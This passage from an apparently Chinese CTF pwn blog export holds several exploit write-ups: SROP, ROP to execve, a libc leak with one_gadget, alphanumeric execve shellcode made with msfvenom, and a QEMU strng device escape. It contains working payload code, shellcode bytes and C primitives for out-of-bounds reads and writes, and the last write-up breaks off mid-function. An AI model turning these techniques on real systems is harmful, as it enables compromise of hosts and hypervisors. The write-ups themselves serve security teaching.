stack_addr#设置SROP执行完的rsp位置\n#设置执行SROP之后的rsp为stack_addr，里面存的是start_addr，retn指令执行后从start开始。\nframe_read.rip = syscall_addr#设置SROP中的一段代码指令\n```\n\n(2)发送payload。\n\n```\n#注释头\n\npayload1 = \"\"\npayload1 += p64(start_addr)#读取payload[8:8+15]，设置rax=0xf0\npayload1 += p64(syscall_addr)#利用rax=0xf0,调用SROP\npayload1 += str(frame_read)\nio.send(payload1)\nsleep(3)\nio.send(payload1[8:8+15])\n#为rax赋值为0xf0\nsleep(3)\n```\n\n程序运行SROP过程中，会执行read函数，将payload2读取到stack_addr处，所以当程序运行完SROP后，栈顶rsp被劫持到stack_addr处，同时stack_addr上保存的内容是payload2，首地址是start，所以retn执行后仍旧从start开始。\n\n(3)设置第二次的SigreturnFrame攻击：\n\n```\n#注释头\n\nframe_execve = SigreturnFrame()\n#设置execve的SROP帧，注意计算/bin/sh\\x00所在地址\nframe_execve.rax = constants.SYS_execve\nframe_execve.rdi = stack_addr+0x108\nframe_execve.rip = syscall_addr\n```\n\n这里的0x108是计算出来的，需要计算从stack_addr到rdi，也就是binsh字符串的距离。由于传进去的是结构体，大小为0xf8。前一个例子中binsh字符串是放在str(frameExecve)之前，所以没有那么大。这里却是放在str(frame_execve)之后，所以从stack_addr为起始，start_addr，syscall_addr，frame_execve)，总共为0xf8+0x08*2=0x108，这里不太懂可以调试一下看看。也就是再一次start_addr读取字符串binsh的位置。\n\n8.发送payload，读取binsh字符串，getshell：\n\n```\n#注释头\n\npayload2 = \"\"\npayload2 += p64(start_addr)#处在stack_addr处，读取payload[8:8+15]，设置rax=0xf0\npayload2 += p64(syscall_addr)#处在stack_addr+0x08,利用rax=0xf0,调用SROP\npayload2 += str(frame_execve)#处在stack_addr+0x10\npayload2 += \"/bin/sh\\x00\"#处在stack+0x108处\nio.send(payload2)\nsleep(3)\nio.send(payload2[8:8+15])\nsleep(3)\nio.interactive()\n```\n\n9.尝试使用mprotect为栈内存添加可执行权限x，从而shellcode来getshell。\n\n(1)第一段的劫持栈和读取payload2进入劫持栈处都是一样的\n\n```\n#注释头\n\nframe_read = SigreturnFrame()#设置read的SROP帧\nframe_read.rax = constants.SYS_read\nframe_read.rdi = 0\nframe_read.rsi = stack_addr\nframe_read.rdx = 0x300\nframe_read.rsp = stack_addr\n#读取payload2，这个stack_addr地址中的内容就是start地址，SROP执行完后ret跳转到start\nframe_read.rip = syscall_addr\n```\n\n(2)第二段需要调用mprotect来修改权限：\n\n```\n#注释头\n\nframe_mprotect = SigreturnFrame()\n#设置mprotect的SROP帧，用mprotect修改栈内存为RWX\nframe_mprotect.rax = constants.SYS_mprotect\nframe_mprotect.rdi = stack_addr & 0xFFFFFFFFFFFFF000\nframe_mprotect.rsi = 0x1000\nframe_mprotect.rdx = constants.PROT_READ | constants.PROT_WRITE | constants.PROT_EXEC\n#权限为R,W,X\nframe_mprotect.rsp = stack_addr\n#劫持栈地址rsp\nframe_mprotect.rip = syscall_addr\n```\n\n(3)最后的shellcode:\n\n```\n#注释头\n\npayload2 = \"\"\npayload2 += p64(stack_addr+0x10) #处在stack_addr\n#SROP执行完后，ret到stack_addr+0x10处的代码，即执行shellcode\npayload2 += asm(shellcraft.amd64.linux.sh())#处在stack_addr+0x10\nio.send(payload2)\nsleep(3)\nio.interactive()\n```\n\n \n\n参考资料：\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n\n \n","tags":["SROP"],"categories":["PWN","SROP0x8"]},{"title":"pwnable.kr-login","url":"/2021/08/14/Alictf 2016-vss/","content":"\n1.常规checksec,开了NX保护，IDA打开找漏洞，发现程序特别奇怪，没有main函数，这里应该是把elf文件的符号信息给清除了。正常情况下编译出来的文件里面带有符号信息和调试信息，这些信息在调试的时候非常有用，但是当文件发布时，这些符号信息用处不大，并且会增大文件大小，这时可以清除掉可执行文件的符号信息和调试信息，文件尺寸可以大大减小。可以使用strip命令实现清除符号信息的目的。\n\n2.虽然这里找不到main函数，但是start函数是一定会存在的，由于start按F5反汇编不成功，所以这里进入到start函数的汇编代码中：\n\n由于start中的结构基本固定，最后基本上都是如下，所以这里sub_4011B1其实就是main函数，这里就可以点进去看了。\n\n```\n#注释头\n\nmov     rdi, offset main\ncall    _libc_start_main\n```\n\n2.这里的main函数可以反汇编成功，那么就开始分析漏洞。第一个函数是sub_4374E0，进去之后如下\n\n```\n#注释头\n\nsigned __int64 result; // rax\nresult = 37LL;\n__asm { syscall; LINUX - sys_alarm }\n```\n\n使用系统调用号37，也就是0x25，代表alarm。\n\n3.sub_408800字符串单参数，且参数都被打印到屏幕上，可以猜测是puts。sub_437EA0调用sub_437EBD，并且fd参数位为0号，且接收三个参数，看下汇编代码：\n\n```\n#注释头\n\nmov       eax, 0\nsyscall;  LINUX - sys_read\n```\n\n调用0号syscall，推测为read函数。(系统调用号有)\n\n4.进入sub_40108E函数中分析，这个函数处理了我们的输入，可以说就是关键函数了。看半天啥也没看懂，直接上调试。先输入十几个A看看，发现经过sub_400330函数之后，内存中输入的A，也就是a1处的内容被复制到了v2，这里先猜测是个类似strncpy函数的东西。然后看内容，既然局部变量v2只有0x40,而这个复制函数的的参数有80,也就是0x50，多了0x10。那么再调试看看，输入0x48个字节A，发现sub_40108E函数的ebp被我们改掉了：\n\nsub_400330((__int64)&v2, a1, 80LL);\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191549889.jpeg)\n\n但是程序接着运行下去却不太行，陷入了循环，然后一直运行后崩溃，连之后的read(v8, (__int64)&v3, 40LL);这段read代码都没有运行。\n\n5.再观察下程序，有个代码有意思：\n\n```\n#注释头\n\nsub_400330((__int64)&v2, a1, 0x50LL);\nif ( (_BYTE)v2 == 'p' && BYTE1(v2) == 'y' )\n    return 1LL;\n```\n\n在复制完字符串之后进入一个判断语句，如果开头是py，就直接retn，不经过下面代码，所以我们完全可以在这就直接返回。但是这里有个问题，这个return有没有汇编指令里的leave操作呢，如果没有，那rsp仍然在最前面，不会跳转到返回地址的地方，看汇编代码，可以看到最后是通过判断后跳转到了locret_40011AF，而这段地址里就是leave和retn的汇编操作，能够将rsp拉到返回地址处，那直接return就完事了。![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191550236.jpeg)\n\n6.那么这里就可以判断出来我们的输入会被复制到v2这个局部变量中，并且最多0x50，也就是说除开rbp，我们可以再控制一个该函数的返回地址。那么开始尝试呗。由于只有一个返回地址，没有后门程序，最先想到的肯定是onegadget，但是不知道libc版本，没办法onegadget。那只有一个返回地址可以做什么，那么只有栈劫持了。其它WP大多都是抬高rsp，我想可不可以降低rsp，通过一次payload来getshell，也就是通过ROPgadget搜索sub rsp，但是搜出来的都不太行，要么太大，超过0x50，要么就很奇怪。然后一般栈劫持需要一个ret来接着控制程序流，这里也没搜到。同时由于使用的复制函数经过调试就是strncpy，字符串里不能有\\x00，否则会被当做字符串截断从而无法复制满0x50字节制造可控溢出，这就意味着任何地址(因为地址基本都会在最开始带上00)都不能被写在前0x48个字节中，彻底断了sub rsp的念想。所以还是抬高栈吧。但是抬高栈也有点问题，就是我们输入的被复制的只有0x50个字节，抬高有啥用，不可控啊。然后就想到之前的read函数，读了400个字节，而紧接着就是调用该函数。刚好局部变量v2第一个被压栈，与sub_40108E函数栈的栈底紧紧挨在一起，也就是说越过sub_40108E函数栈的栈底和返回地址就可以直接来到main函数栈。而main函数栈中又只有一个我们输入的局部变量v4，所以sub_40108E函数栈的返回地址之后的第一个地址就是我们输入的局部变量v4的地址。(这里通过调试也可以发现)\n\n7.那么经过计算，其实只要有一个pop,ret操作，让rsp抬高一下就可以到达我们输入的首地址。但是由于经过前面分析，我们需要在程序开头输入py来使得该函数直接return，那么如果只是一个pop,ret操作，那么程序第一个执行的代码就是我们输入的开头，包含了py的开头，这就完全不可控了，开头如果是py那怎么计算才能是一个有效地址呢。\n\n8.那么就只能查找add rsp，只要满足add rsp 0x50之上就可以完全操控了。这里至少需要0x50也是因为这是strncpy，不能将地址写到前0x48个字节，否则会截断，而最后返回地址的覆盖可以被完全复制是这里本来就是一个返回地址，保存的内容应该是00401216，也就是之前call sub_40108E的下一段地址。这里在复制的时候肯定被截断了，但是由于本来就是找到一个可用的地址，截断了覆盖的也只是将401216换成了add rsp 0x58;ret这个地址(如果我们的add rsp的有效地址地方包含了00，那指定会出错)。那么payload的语句应该是payload = \"py\" + \"a\"*(0x48-0x02) + add_rsp_addr + padding + 实际控制代码。\n\n9.利用ROPgadget搜索add esp的相关内容，可以查到一个地址0x46f205，操作是add rsp, 0x58; ret，这样就可以顺利将栈抬升到0x58的地方，所以payload的组成应该是：payload = “py” + “a”*0x46 + p64(0x46f205) + “a”*8 + p64(addr2)+...(a*8是用来填充的，因为抬升到了0x58处，复制之后0x50处是一段空白地方，所以还需要填充一下使p64(addr2)能顺利被抬升至0x58处被执行)。后面的p64(addr2)和...就是我们的常规gadget操作了。\n\n10.现在需要system函数和/bin/sh字符串了。没有Libc，system函数和/bin/sh也没有，所以这里需要输入/bin/sh字符串，然后system函数需要通过syscall来实现。(64位程序下是syscall函数，32位程序下就是Int 0x80)\n\n11.这里先完成binsh的输入：payload = p64(pop_rdx) + p64(rdx_value) + p64(pop_rsi) + p64(rsi_value) + p64(pop_rdi) + p64(rdi_value) + p64(pop_rax)+ p64(rax_value) + p64(syscall)因为是64位程序，函数从左往右读取参数所取寄存器依次为：rdi，rsi，rdx, rcx, r8, r9, 栈传递，但是实际情况中是从右往左读取参数，也就是当只有三个参数时，读取顺序应该是rdx,rsi,rdi对应的为read(rdi,rsi,rdx)。\n\n这里rdx是输入的大小，rsi是输入的内存地址buf(随便找一段可读可写的就行了)，rdi是fd标志位，由于是通过syscall调用，所以除了配置三个read函数参数还需要配置系统调用号，也就是rax的传参为0x0。![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191549806.jpeg)这里如果不使用syscall，其实也可以用我们之前猜出来的read函数的plt表，只是这样就可以不用设置rax了。\n\n▲这里不能使用401202处的call read，因为call会压入下一行代码的作为read返回地址，那样就不可控了。这里选择系统调用是因为没有read在got表中的真实地址，不然其实调用got表地址也可以。\n\n \n\n12.接着调用system函数，同样采用syscall系统调用，需要几个参数的设置rax=59,rdx=0,rsi=0,（这是调用syscall必须的前置条件，因为是linux规定的，可以上网查一下就知道）。都可以通过Pop gadget来实现，之后传参rdi为&buf，最后调用即可getshell。(59为系统调用号)所以紧接着的payload = p64(pop_rax) + p64(rax_value) + p64(pop_rdx) + p64(rdx_value) + p64(pop_rsi) + p64(rsi_value) + p64(pop_rdi) + p64(rdi_value) + p64(syscall)![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191549760.jpeg)这里就必须的设置rax为0x3b了。\n\n▲sh不能用来传给syscall开shell，但是int 0x80可以。syscall-64，int 0x80-32。\n\n▲syscall是在上进入内核模式的默认方法x86-64。该指令在Intel处理器的 32位操作模式下不可用。sysenter是最常用于以32位操作模式调用系统调用的指令。它类似于syscall，但是使用起来有点困难，但这是内核的关注点。int 0x80 是调用系统调用的传统方式，应避免使用，是32位程序下的。\n\n系统调用查询网址：https://syscalls.w3challs.com/\n\n参考资料：\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n\n \n\n \n","tags":["hijackStack"],"categories":["PWN","hijackStack0x4"]},{"title":"BCTF 2017-100levels","url":"/2021/08/14/BCTF 2017-100levels/","content":"\n1.常规checksec，开启了NX和PIE，不能shellcode和简单rop。之后IDA打开找漏洞，E43函数中存在栈溢出漏洞：\n\n```\n#注释头\n\n__int64 buf; // [rsp+10h] [rbp-30h]\n--------------------------------------------------\nread(0, &buf, 0x400uLL);\n```\n\n有栈溢出那么首先想到是应该查看有没有后门，但是这个程序虽然外部引用了system函数，但是本身里并没有导入到.got.plt表中，没办法直接通过.got.plt来寻址。而且开了PIE，就算导入到.got.plt表中，也需要覆盖返回地址并且爆破倒数第四位才能跳转到system函数。虽然有栈溢出，但是没有后门函数，同样也没办法泄露Libc地址。\n\n2.想getshell，又只有一个栈溢出，没有其它漏洞，还开了PIE和NX，那么一定得泄露出地址才能做，而printf地址也因为PIE没办法直接跳转。陷入卡顿，但是这里可以查看E43函数中的printf的汇编代码：\n\n只能通过栈溢出形式来为下一次的printf赋参数来泄露。又由于PIE，也不知道任意一个函数的代码地址，那也没办法泄露被加载进入Libc中的内存地址。\n\n3.通过调试可以看到，进入E43函数中，抵达printf函数时，栈顶的上方有大量的指向libc的地址：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191532908.png)\n\n并且观察E43函数中的汇编代码，可以看到Printf是通过rbp取值的，那么我们可以通过栈溢出修改rbp来使得[rbp+var_34]落在其它地方，而如果这个其它地方有libc地址，那么就相当于泄露出了Libc地址。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191532014.jpeg)\n\n4.这个关卡数是由我们设置的，而且通过递归调用E43函数，形成多个E43的栈，那么进行调试，第二次进入E43的栈之后，仍然在运行到printf函数时，栈顶上方仍旧有大量的Libc地址。由于我们需要修改rbp来使得下一次的printf打印出libc地址，那么关卡最低需要设置两关，第一关用来栈溢出，修改rbp，使得第二关中的printf函数指向栈顶上方从而打印出Libc地址。\n\n5.由于栈的随机化，我们如果随意修改rbp那么就会打印出奇怪的东西，所以修改rbp的最后一个字节，使得[rbp+var_34]能够移动一定范围，以一定几率命中栈顶上方。而又由于是递归调用，第一关的栈在第二关的栈的上方，模型大致如下：\n\n(1)第一次rbp和rsp以及第二次的如图：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191532743.png)  ![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191532872.png)\n\n(2)第一次栈以及第二次栈如图：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191532846.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191532270.png)\n\n▲这里用的是Libc-2.32的，用其他的Libc就不太一样，具体情况具体分析。\n\n6.这里的模型是假设第一次的rsp栈顶后两位为00，但是由于栈地址随机化，所以rsp其实可以从0x00-0xFF之间变化，对应的地址也就是从0-31之间变化。\n\n7.这里先考虑第一个问题，rbp-var34如何落到libc空间中，也就是当0往下移动，变化为大约是4或者5时，即可落到libc空间。同样的，从5-16变化，都可以使得rbp-var34落在libc空间。但是如果0变化成16以上，对应的第二次栈空间rbp就会变成32以上，换算成16进制为0x100，这时修改最后两位，就会变成0x15c，使得它不但不往上走，更会往下走，从而没办法落到libc空间。总而言之，慢慢研究下，然后计算概率大约为12/32=3/8，可以使得落在Libc空间。这里的5c可以改变成其它值x，但是需要x-0x34为8的倍数才行，不然取到的地址会是截断的，但是修改后成功概率会发生改变，因为0x5c扫到的地址范围大概就是libc的栈空间。\n\n8.落在libc空间不代表一定就会落在指向Libc地址上，前面可以看到，在16个地址范围内大概为7个，也就是1/2的概率成功。然后由于有v2%a1这个运算，也就对应汇编代码idiv   [rbp+var_34]，这就导致如果rbp+var_34的数据为0那么就会产生除零操作，这里没办法去掉。需要进行try操作来去除这个错误，使程序重新运行，进行自动化爆破。同时泄露出来的地址会发现有时候是正数有时候是负数。这是因为我们只能泄露出地址的低32位，低8个十六进制数。而这个数的最高位可能是0或者1，转换成有符号整数就可能是正负两种情况。这里进行处理可避免成功率下降：\n\n```\n#注释头\n\nif addr_l8 < 0:\naddr_l8 = addr_l8 + 0x100000000\n```\n\n9.但是泄露出来的地址由于printf的参数是%d，所以打印出来的是32位地址，还需要猜剩下32位。但是这里有个技巧，貌似所有64程序加载后的代码段地址都在0x000055XXXXXXXXXX-0x000056XXXXXXXXXX之间徘徊，对应的libc加载段在0x00007EXXXXXXXXXX-0x00007FXXXXXXXXXX范围，以下是测试数据：\n\n程序开头段.load首地址和debug段首地址：\n\n```\n#注释头\n\n00007F1301D2A000  \n000056238FCAB000\n差值为28EF 7207 F000\n\n00007FCB31061000\n000055D513E06000\n差值为29F6 1D25 B000\n\n00007F58EFF09000\n000055F7C1BEC000\n差值为2983 DC10 3000\n```\n\n具体原理好像是PIE源代码随机的关系，但具体不太清楚，能用就行。所以高32位就可以假设地址为0x00007fxx，所以这里需要爆破0x1ff大小，也就是511，相当于512次，但是其实可以知道，大概率是落在0x7f里，看数据分析也可以知道，所以实际爆破次数基本在500次以内。所以将泄露出来的地址加上一个在0x7f里的值，也就是addr = addr_l8 + 0x7f8b00000000，之后再根据Libc空间中指向libc地址的后两位来区分地址：并减去在libc中查到的偏移量即可得到Libc基地址。\n\n```\n#注释头\n\nif hex(addr)[-2:] == '0b': #__IO_file_overflow+EB\nlibc_base = addr - 0x7c90b\n\nelif hex(addr)[-2:] == 'd2': #puts+1B2\nlibc_base = addr - 0x70ad2\n\nelif hex(addr)[-3:] == '600':#_IO_2_1_stdout_\nlibc_base = addr - 0x3c2600\n\nelif hex(addr)[-3:] == '400':#_IO_file_jumps\nlibc_base = addr - 0x3be400\n\nelif hex(addr)[-2:] == '83': #_IO_2_1_stdout_+83\nlibc_base = addr - 0x3c2683\n\nelif hex(addr)[-2:] == '32': #_IO_do_write+C2\nlibc_base = addr - 0x7c370 - 0xc2\n\nelif hex(addr)[-2:] == 'e7': #_IO_do_write+37\nlibc_base = addr - 0x7c370 - 0x37\n```\n\n所以算上命中概率，其实调试的时候可以看到，第一关的栈空间中由于程序运行结果也会有几个指向Libc地址，加上这几个也可以提高成功率，因为修改的rbp也是有可能落在第一关的栈空间。总的爆破次数应该就是500/((1/2)*(3/8))，约为2500次，还能接受。\n\n10.泄露出Libc地址之后一般就有两种方法，一种是利用栈溢出，调用万能gadget用system函数进行binsh字符串赋值，从而getshell。还有一种就是，利用one_gadget来getshell，通过查看E43返回时的汇编代码有一个move eax,0；满足libc-2.23.so的其中一个one_gadget的条件，那么直接用就行。\n\n11.最后libc基地址加上one_gadget的偏移地址就可以得到one_gadget的实际地址。\n\none_gadget = libc_base + 0x45526\n\n之后在第二关中再次进行栈溢出覆盖rip来跳转到one_gadget即可getshell。\n\n \n\n参考资料：\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n\n \n","tags":["PIE"],"categories":["PWN","PIE0x7"]},{"title":"BSides San Francisco CTF 2017-b_64_b_tuff","url":"/2021/08/14/BSides San Francisco CTF 2017-b_64_b_tuff/","content":"\n \n\n1.常规checksec下，只开了NX，之后IDA打开文件之后，有如下语句：\n\n```\n#注释头\n\ns = (char *)base64_encode((int)buf, v7, v5);\n((void (*)(void))v5)();\n```\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191555015.jpeg)\n\n这里v7是输入的Buf，v5是mmap分配的内存空间。之后的语句：代表了将v5对应的内存空间强制转化为函数指针并且调用，在汇编代码中也可以看出来：这里的[ebp+var_18]就是我们输入的buf经过编码base64编码后存放的地方。\n\n```\n#注释头\n\ntext:0804879C var_18          = dword ptr -18h\n```\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191555021.jpeg)\n\n3.所以我们输入的内容就成了会被执行的汇编代码，也就是可以输入Shellcode，来执行我们需要的命令。这里可以看一个连接网址，从里面找shellcode：\n\nhttp://shell-storm.org/shellcode/\n\n可以通过linux/x86/sh/bash/execve/shellcode等等关键词来查找，这里直接给出一个可用的shellcode:\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191555344.jpeg)\n\n \n\n```\n#注释头\n\n\\x31\\xc9\\xf7\\xe1\\xb0\\x0b\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xcd\\x80\n```\n\n4.但是有Base64_encode，所以我们输入的需要会被base64编码，而base64编码只能由只由0-9，a-z，A-Z，+，/这些字符组成，(这里就是对应的ascii转换表中内容)所以常规的shellcode就不合格，我们这里选中的shellcode中某些字符就没办法被base64编码，所以这里需要用到msfvenom来选择一个可用的编码器，将我们常规的shellcode编码成可以被base64编码的shellcode。\n\n5.打开Linux，输入msfvenom -l encoders可以查看编码器，后面有介绍，可以看一下，从中选择一个可用的编码器对shellcode进行编码即可。\n\n6.查到x86/alpha_mixed这个编码器可以将我们输入的shellcode编码成大小写混合的代码，符合条件。\n\nx86/alpha_mixed low Alpha2 Alphanumeric Mixedcase Encoder\n\n运行编码器的代码如下：\n\npython -c 'import sys; sys.stdout.write(\"\\x31\\xc9\\xf7\\xe1\\xb0\\x0b\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xcd\\x80\")' | msfvenom -p - -e x86/alpha_mixed -a linux -f raw -a x86 --platform linux BufferRegister=EAX -o payload\n\n7.输入这段代码运行之后可以看到当前文件夹目录下生成了一个payload文件，文本打开就可以看到编码后的shellcode:\n\nPYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIp1kyigHaX06krqPh6ODoaccXU8ToE2bIbNLIXcHMOpAA\n\n8.之后需要将这段可以被Base64编码的进行Base64解码，得到的shellcode再被程序中的Base64编码后才是我们真正起作用的shellcode。利用python脚本即可。\n\n \n\n \n\n \n\n▲\n\n1.’import sys; sys.stdout.write(“shellcode”)’：这是导入包之后写入编码的shellcode。\n\n2.由于msfvenom只能从stdin中读取，所以使用Linux管道符”|”来使得shellcode作为python程序的输出。\n\n3.此外配置编码器为x86/alpha_mixed，配置目标平台架构等信息，输出到文件名为payload的文件中。\n\n4.由于在b-64-b-tuff中是通过指令call eax调用shellcode的eax,所以配置BufferRegister=EAX。最后即可在payload中看到对应的被编码后的代码。这段shellcode代码就可以被base64编码成我们需要的汇编代码。\n\n \n\n \n\n参考资料：\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n","tags":["shellcode"],"categories":["PWN","Shellcode0x2"]},{"title":"BlizzardCTF2017-Strng","url":"/2021/08/14/BlizzardCTF2017-Strng/","content":"\n1.打开虚拟环境，然后都说flag在/root/flag，给的也不是vmlinux，那么就应该是qemu逃逸。\n\n2.由于只有文件，大佬们都直接告诉用户名密码，也没说怎么找，那就当作本来题目给了用户名和密码。用户名是ubuntu，密码是passw0rd。\n\n3.将qemu-system-x86_64拖到IDA中开始分析，会分析很长一段时间，先看看启动参数，launch.sh：\n\n```\n./qemu-system-x86_64 \\\n    -m 1G \\\n    -device strng \\\n    -hda my-disk.img \\\n    -hdb my-seed.img \\\n    -nographic \\\n    -L pc-bios/ \\\n    -enable-kvm \\\n    -device e1000,netdev=net0 \\\n    -netdev user,id=net0,hostfwd=tcp::5555-:22\n```\n\n没啥好注意的，显示加载了设备strng，那么这应该就是需要分析的PCI设备。然后最后一行netdev user,id=net0,hostfwd=tcp::5555-:22，把22端口重定向到了宿主机的5555端口，所以使用ssh ubuntu@127.0.0.1 -p 5555进去。同时这里注意加载内存要1G，为了防止崩溃，我改成了128M。\n\n4.然后进入qemu中看看设备信息，好找到mmio和pmio的地址：\n\n(1)首先输入lspci，可以看到有一个Unclassified device\n\n00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)\n\n这个就应该是strng设备了。\n\n(2)加载IDA完成之后验证一下，函数栏搜索strng，查看相关函数。先查看设备初始化函数：strng_class_init。(这里需要将变量k的类型设置为PCIDeviceClass*)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191502012.jpeg)\n\n可以看到加载了strng设备，然后设备号device_id是0x11e9，vendor_id是0x1234，对应在qemu中查看一下刚才猜测的strng设备，输入：lspci -v -s 00:03.0\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191502897.jpeg)\n\n可以看到猜测没错。同时可以看到对应的mmio地址为0xfebf1000，大小256。pmio的地址为0xc050，大小8。\n\n▲有时候这些命令可能不好使，判断完设备号之后，可以输入：\n\nhexdump /sys/devices/pci0000\\:00/0000\\:00\\:03.0/config来查看\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191502926.jpeg)\n\n5.之后从read和write函数中找漏洞：\n\n这里将第一个参数opaque修改下类型为：struct STRNGState*，至于为什么是这个，打开read和write的汇编代码，很明显发现有STRNGState*，然后再跳转到结构体界面中找，虽然不太好找。找到之后双击，可以显示出结构体的所有成员，发现就是需要的那个：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191502018.jpeg)\n\n(1)先看strng_mmio_read函数，读入addr并按二进制将其右移两位，相当于除以4，之后将结果作为regs数组的索引，返回该regs[add>>2]的值。同时还需要注意的是addr的低两位只能为0，否则过不了if ( size == 4 && !(addr & 3) )的检查。\n\n(2)再看strng_mmio_write函数：\n\n当size等于4时，将addr右移两位得到寄存器的索引idx，并提供4个功能：\n\n①当idx为0时，调用srand函数但并不给赋值给内存。当i为1时，调用rand得到随机数并赋值给regs[1]。\n\n②当idx为3时，调用rand_r函数，使用regs[2]的地址作为参数，最后将返回值赋值regs[3]，但后续仍然会将val值覆盖到regs[3]中，就是迷惑用的，实际功能也就是将传入的value赋值给regs[3]。\n\n▲但是这里的传regs[2]的地址也是一个关键，如果我们能将rand_r函数劫持为system函数，然后在regs[2]中放入\"cat /root/flag\"字符串，那不就可以调用system(\"cat /root/flag\")从而读取flag了吗。\n\n其余则直接将传入的value赋值给regs[idx]。\n\n那么通过控制addr，进而控制idx>=2，就可以逐次将4个字节数据写入到regs[idx]上。\n\n▲按理说如果将idx超出regs数组范围，64之后，那么不就可以任意越界写了吗，但是这里不行，因为传入的addr是不能大于mmio的大小，pci设备内部会进行检查，而刚好regs的大小为256，所以无法通过mmio进行越界读写。\n\n(3)接着看strng_pmio_read函数：当传入的端口地址addr为0时，直接返回opaque->addr，否则将opaque->addr右移两位作为索引idx，返回regs[idx]的值。这个opaque->addr在strng_pmio_write中被赋值。\n\n(4)然后再看strng_pmio_write函数：\n\n当size等于4时，以传入的端口地址为判断提供4个功能：\n\n①当传入的端口地址addr为0时，直接将传入的value赋值给opaque->addr。\n\n②当传入的端口地址addr不为0时，将opaque->addr右移两位得到索引idx，分为三个功能：\n\nA.idx为0时，执行srand，返回值不存储。\n\nB.idx为1时，执行rand并将返回结果存储到regs[1]中。\n\nC.idx为3时，调用rand_r并将regs[2]的地址作为第一个参数，返回值存储到regs[3]中。\n否则直接将value存储到regs[idx]中。\n\n▲这里就可以调用strng_pmio_write函数，形成任意地址写漏洞。\n\nA.通过将addr设置为0，然后使得传入的value直接赋值给opaque->addr，使得opaque->addr形成的索引idx大于64，将reg[idx]越界指向rand_r函数指针。\n\nB.然后再次调用strng_pmio_write函数，传入不为0的addr。通过opaque->addr形成的索引idx，使得regs[idx]指向rand_r函数指针，将value越界写入rand_r，劫持rand_r函数。\n\n6.那么总的利用过程就清楚了：\n\n(1)通过strng_mmio_write函数，将regs[2]赋值为\"cat /root/flag\"。\n\n(2)通过strng_pmio_write函数，将rand_r函数劫持为system函数。\n\n之后再调用strng_mmio_write函数，使得idx为3，然后将regs[2]的地址作为参数，调用rand_r函数，从而调用system(\"cat /root/flag\")获取flag。\n\n7.但是现在还需要system函数的地址，通过上面分析，可以发现有一个越界读漏洞：\n\n(1)通过strng_pmio_write函数设置opaque->addr，使得opaque->addr形成的索引idx大于64，进而使得regs[idx]指向srand函数。\n\n(2)通过strng_pmio_read函数，借助修改后的opaque->addr，读取idx索引regs[idx]指向的内容，也就是srand函数指针中的内容，对应的就是srand函数地址。\n\n(这里大多数的exp都是针对srandom函数来泄露libc的，但rand或者rand_r应该也都可以)\n\n8.那么现在总的利用过程就是泄露libc地址，然后改写rand_r函数为system函数，将\"cat /root/flag\"写入到regs[2]，之后通过rand_r(regs[2])来调用system(\"cat /root/flag\")从而获得flag。\n\n9.开始编写poc：\n\n(1)写好访问pmio和mmio空间的调用函数，及前置参数：\n\n```\n#注释头\n\nunsigned char* mmio_mem;\nuint32_t pmio_base=0xc050;\n\nvoid die(const char* msg)\n{\n    perror(msg);\n    exit(-1);\n}//用来打印错误信息，退出用的，不写也没关系\n\nvoid mmio_write(uint32_t addr, uint32_t value)\n{\n    *((uint32_t*)(mmio_mem + addr)) = value;\n}\n\nuint32_t mmio_read(uint32_t addr)\n{\n    return *((uint32_t*)(mmio_mem + addr));\n}\n\nuint32_t pmio_write(uint32_t addr, uint32_t value)\n{\n    outl(value,addr);\n}\n\n\nuint32_t pmio_read(uint32_t addr)\n{\n    return (uint32_t)inl(addr);\n}\n```\n\n(2)打开resource0文件，利用mmap将mmio空间映射出来：\n\n```\n//注释头\n\n// Open and map I/O memory for the strng device\nint mmio_fd = open(\"/sys/devices/pci0000:00/0000:00:03.0/resource0\", O_RDWR | O_SYNC);\nif (mmio_fd == -1)\n    die(\"mmio_fd open failed\");\n\nmmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);\nif (mmio_mem == MAP_FAILED)\n    die(\"mmap mmio_mem failed\");\n\nprintf(\"mmio_mem @ %p\\n\", mmio_mem);\n```\n\n(3)对mmio空间进行写操作，调用strng_mmio_write函数，将\"cat /root/flag\"写入到regs[2]中：\n\n```\n//注释头\n\nmmio_write(8,0x20746163);\nmmio_write(12,0x6f6f722f);\nmmio_write(16,0x6c662f74);\nmmio_write(20,0x6761);\n```\n\n这里由于需要满足传入的addr右移两位后形成的idx需要>=2，所以从8依次开始。\n\n(4)编写pmio空间越界读和越界写的函数：\n\n```\nuint32_t pmio_arbread(uint32_t offset)\n{\n    pmio_write(pmio_base+0,offset);\n    return pmio_read(pmio_base+4);\n}\n\nvoid pmio_abwrite(uint32_t offset, uint32_t value)\n{\n    pmio_write(pmio_base+0,offset);\n  